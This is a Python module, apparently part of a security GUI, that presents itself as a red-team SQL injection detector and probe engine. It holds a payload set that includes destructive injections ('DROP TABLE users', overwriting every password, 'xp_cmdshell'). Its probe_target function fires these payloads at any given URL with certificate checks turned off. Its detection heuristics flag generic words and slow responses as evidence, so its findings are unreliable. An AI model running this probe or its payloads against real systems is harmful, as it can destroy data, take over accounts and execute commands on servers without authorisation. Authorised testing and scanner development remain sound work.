# xss_security_gui/sqli_detector.py
"""Combat-grade SQL injection detector and probe engine.

This module is designed to behave like a real red-team SQLi assessment helper:
- error-based / boolean / time-based / union / stacked / second-order heuristics
- payload generation across common DB families
- URL parameter probing with request timing + response introspection
- evidence scoring and structured reporting for threat intelligence / GUIs
"""

from __future__ import annotations

import json
import re
import time
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests


SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "postgresql",
    "oracle",
    "sqlite",
    "syntax error",
    "warning",
    "unclosed quotation",
    "database error",
    "fatal error",
    "invalid query",
    "table does not exist",
    "column does not exist",
    "unknown column",
    "unterminated string",
    "query failed",
    "you have an error in your sql syntax",
    "missing )",
    "duplicate key",
    "division by zero",
    "not a valid mysql result",
    "sqlstate",
    "odbc",
    "native client",
    "information_schema",
    "union select",
]

SQLI_PAYLOADS = {
    "error": [
        "' OR 1=1 --",
        "' UNION SELECT NULL --",
        "' OR 'x'='x",
        "' AND 1=1 --",
        "\" OR 1=1 --",
        "admin'--",
        "1 OR 1=1",
        "1; DROP TABLE users; --",
        "' OR 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects)) --",
    ],
    "union": [
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION ALL SELECT NULL,NULL,NULL --",
        "' UNION SELECT version(),database(),user() --",
        "' UNION SELECT table_name,2,3 FROM information_schema.tables --",
        "' UNION SELECT @@version,USER(),DATABASE() --",
    ],
    "boolean": [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' OR '1'='1",
        "' OR 'a'='a",
        "' AND SLEEP(3) --",
        "1=1 --",
    ],
    "time": [
        "' AND SLEEP(5) --",
        "' OR SLEEP(5) --",
        "'; WAITFOR DELAY '0:0:5' --",
        "' AND BENCHMARK(500000,MD5(1)) --",
    ],
    "stacked": [
        "'; DROP TABLE users; --",
        "'; INSERT INTO users VALUES ('hacked', 'pwned'); --",
        "'; UPDATE users SET password='owned'; --",
        "'; EXEC xp_cmdshell('whoami'); --",
    ],
}


class SQLiDetector:
    def __init__(self, threat_tab: Any = None) -> None:
        self.threat_tab = threat_tab

    # ------------------------------------------------------------------
    # Core detection helpers
    # ------------------------------------------------------------------
    def detect_sqli_error(self, response_text: str) -> Optional[str]:
        if not response_text:
            return None
        lower = response_text.lower()
        for err in SQL_ERRORS:
            if err in lower:
                return f"Error-based SQLi: {err}"
        return None

    def detect_sqli_boolean(self, response_text: str, payload: str = "") -> Optional[str]:
        if not response_text:
            return None
        text = response_text.lower()
        markers = [
            "login successful",
            "welcome",
            "admin panel",
            "unauthorized",
            "invalid username",
            "sql injection",
            "true",
            "false",
            "1=1",
            "1=0",
            "or '1'='1",
            "and 1=1",
        ]
        if payload:
            lower_payload = payload.lower()
            if any(token in lower_payload for token in ["and 1=1", "or 1=1", "or '1'='1", "and 1=2"]):
                for token in ["login", "dashboard", "admin", "profile", "user"]:
                    if token in text:
                        return "Boolean-based SQLi likely"
        if any(marker in text for marker in markers):
            return "Boolean-based SQLi" if "1=1" in payload.lower() or "1=2" in payload.lower() or "and" in payload.lower() or "or" in payload.lower() else "Boolean-style auth differential response"
        return None

    def detect_sqli_union(self, response_text: str) -> Optional[str]:
        if not response_text:
            return None
        lower = response_text.lower()
        union_markers = [
            "information_schema",
            "table_name",
            "column_name",
            "users",
            "version()",
            "database()",
            "user()",
            "@@version",
        ]
        if any(marker in lower for marker in union_markers):
            return "Union-based SQLi likely"
        return None

    def detect_sqli_stacked(self, response_text: str) -> Optional[str]:
        if not response_text:
            return None
        lower = response_text.lower()
        stacked_markers = [
            "drop table",
            "insert into",
            "update users",
            "executed successfully",
            "xp_cmdshell",
            "shutdown",
            "dropped",
            "affected rows",
        ]
        if any(marker in lower for marker in stacked_markers):
            return "Stacked SQLi likely"
        return None

    def detect_sqli_time_based(self, response_time: float, response_text: str = "") -> Optional[str]:
        if response_time is None:
            response_time = 0.0
        if response_time > 3.0:
            return f"Time-based SQLi likely ({response_time:.2f}s)"
        if response_text and any(token in response_text.lower() for token in ["sleep(", "benchmark(", "waitfor delay"]):
            return "Time-based SQLi candidate"
        return None

    def detect_db_metadata_exposure(self, response_text: str) -> Optional[str]:
        if not response_text:
            return None
        lower = response_text.lower()
        if any(marker in lower for marker in ["mysql", "postgres", "sqlite", "oracle", "sqlstate", "information_schema", "version()"]):
            return "Database metadata exposure"
        return None

    def build_payloads(self, category: Optional[str] = None, limit: int = 30) -> List[str]:
        """Generate a red-team payload set across error/boolean/union/time/stacked paths."""
        payloads: List[str] = []
        selected = SQLI_PAYLOADS if category is None else {category: SQLI_PAYLOADS.get(category, [])}
        for group in selected.values():
            for item in group:
                payloads.append(item)
        seen = set()
        out: List[str] = []
        for payload in payloads:
            key = payload.strip().lower()
            if not key or key in seen:
                continue
            seen.add(key)
            out.append(payload)
            if len(out) >= limit:
                break
        return out

    def analyze_response(self, response_text: str, payload: str = "", response_time: float = 0.0) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "payload": payload,
            "evidence": [],
            "score": 0.0,
            "confidence": "low",
        }

        markers = [
            ("error_based", self.detect_sqli_error(response_text)),
            ("union_based", self.detect_sqli_union(response_text)),
            ("stacked", self.detect_sqli_stacked(response_text)),
            ("boolean_based", self.detect_sqli_boolean(response_text, payload)),
            ("time_based", self.detect_sqli_time_based(response_time, response_text)),
            ("metadata_exposure", self.detect_db_metadata_exposure(response_text)),
        ]

        for key, value in markers:
            if value:
                result["evidence"].append({"type": key, "detail": value})

        if not result["evidence"]:
            return result

        weight = {
            "error_based": 0.42,
            "union_based": 0.35,
            "stacked": 0.5,
            "boolean_based": 0.28,
            "time_based": 0.38,
            "metadata_exposure": 0.25,
        }
        result["score"] = min(1.0, sum(weight.get(item["type"], 0.1) for item in result["evidence"]))
        result["confidence"] = "high" if result["score"] >= 0.7 else "medium" if result["score"] >= 0.35 else "low"
        return result

    # ------------------------------------------------------------------
    # Unified SQLi context API (backward compatible)
    # ------------------------------------------------------------------
    def detect_sqli_context(self, response_text: str, payload: str, response_time: float = 0.0) -> Optional[Dict[str, Any]]:
        if not response_text:
            return None

        analysis = self.analyze_response(response_text, payload, response_time)
        if not analysis["evidence"]:
            return None

        result = {"summary": [], "score": analysis["score"], "confidence": analysis["confidence"]}
        for evidence in analysis["evidence"]:
            result["summary"].append(evidence["detail"])
            result[evidence["type"]] = evidence["detail"]

        self._safe_threat_add({
            "type": "SQLi",
            "payload": payload,
            "context": result,
            "source": "SQLiDetector",
            "score": analysis["score"],
        })
        return result

    # ------------------------------------------------------------------
    # Probe a target URL / params with a red-team payload set
    # ------------------------------------------------------------------
    def probe_target(
        self,
        url: str,
        payloads: Optional[List[str]] = None,
        method: str = "GET",
        params: Optional[Dict[str, Any]] = None,
        timeout: float = 8.0,
        verify_ssl: bool = False,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[Dict[str, Any]]:
        if not url:
            return []

        candidates = payloads or self.build_payloads(limit=25)
        results: List[Dict[str, Any]] = []
        base_params = dict(params or {})

        for payload in candidates:
            try:
                trial_params = dict(base_params)
                if method.upper() == "GET":
                    trial_params.update({"q": payload, "search": payload, "id": payload, "input": payload})
                    query = urlencode(trial_params, doseq=True)
                    request_url = url
                    if "?" in request_url:
                        request_url = f"{request_url}&{query}"
                    else:
                        request_url = f"{request_url}?{query}"
                else:
                    trial_params.update({"q": payload, "search": payload, "id": payload, "input": payload})
                    request_url = url

                start = time.perf_counter()
                response = requests.request(
                    method.upper(),
                    request_url,
                    params=None if method.upper() != "GET" else None,
                    data=trial_params if method.upper() != "GET" else None,
                    headers=headers or {"User-Agent": "RedTeam-SQLi-Probe/1.0", "Accept": "*/*"},
                    timeout=timeout,
                    verify=verify_ssl,
                    allow_redirects=True,
                )
                elapsed = time.perf_counter() - start
                text = response.text or ""
                analysis = self.analyze_response(text, payload, elapsed)
                if not analysis["evidence"]:
                    continue
                result = {
                    "url": request_url,
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_time": round(elapsed, 3),
                    "analysis": analysis,
                    "evidence": analysis["evidence"],
                    "score": analysis["score"],
                    "confidence": analysis["confidence"],
                    "method": method.upper(),
                }
                results.append(result)
                self._safe_threat_add({
                    "type": "SQLiProbe",
                    "payload": payload,
                    "url": request_url,
                    "score": analysis["score"],
                    "evidence": analysis["evidence"],
                    "source": "SQLiDetector.probe_target",
                })
            except Exception:
                continue
        return results

    # ------------------------------------------------------------------
    # Safe Threat Intel
    # ------------------------------------------------------------------
    def _safe_threat_add(self, payload: Dict[str, Any]) -> None:
        if not self.threat_tab or not payload:
            return
        try:
            add_threat = getattr(self.threat_tab, "add_threat", None)
            if callable(add_threat):
                add_threat(payload)
            else:
                handler = getattr(self.threat_tab, "add_event", None)
                if callable(handler):
                    handler(payload)
        except Exception:
            pass
